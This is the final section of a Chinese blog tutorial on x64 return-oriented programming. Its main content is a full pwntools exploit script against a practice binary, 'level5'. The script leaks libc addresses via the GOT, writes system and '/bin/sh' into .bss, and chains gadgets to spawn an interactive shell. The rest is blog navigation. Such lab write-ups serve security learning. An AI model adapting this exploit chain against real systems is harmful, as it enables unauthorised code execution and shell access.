+<p>最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">#context.log_level=&apos;debug&apos;</div><div class="line"></div><div class="line">elf = ELF(&apos;level5&apos;)</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level5&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot; + hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">main = 0x400587</div><div class="line"></div><div class="line">off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;off_system_addr: &quot; + hex(off_system_addr)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#write(rdi=1, rsi=write.got, rdx=8)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload1#############\n&quot;</div><div class="line">p.send(payload1)</div><div class="line">sleep(1)</div><div class="line">#data=p.recv()</div><div class="line">data=p.recv(8)</div><div class="line">print data</div><div class="line">write_addr = u64(data)</div><div class="line">print &quot;write_addr: &quot; + hex(write_addr)</div><div class="line"></div><div class="line">system_addr = write_addr - off_system_addr</div><div class="line">print &quot;system_addr: &quot; + hex(system_addr)</div><div class="line"></div><div class="line">bss_addr=0x601040</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#read(rdi=0, rsi=bss_addr, rdx=16)</div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40061a) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(main)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload2#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">p.send(p64(system_addr))</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(0x40061a) + p64(0)+ p64(1) + p64(bss_addr) + p64(0) + p64(0)+ p64(bss_addr+8)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload3 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload3 += &quot;\x00&quot;*56</div><div class="line">payload3 += p64(main)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload3#############\n&quot;</div><div class="line"></div><div class="line">#sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>执行后的结果：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/37.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/10/14/一步一步学ROP之x64篇/" data-id="cjfgehm2r0007vguna9fovmtl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术文章/">技术文章</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/12/05/Reverse练习/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Reverse练习 writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/10/12/pwntools的安装方法/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">pwntools的安装方法</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">√素顏☃繁華夢☪</h1>
+    <h2 class="blog-subtitle">Go!Go!Go!</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/xiaorui1234" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://foxroot.cn/" target="_blank" title="FoxRoot">
+          FoxRoot
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 XiaoRui<br>
+      
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
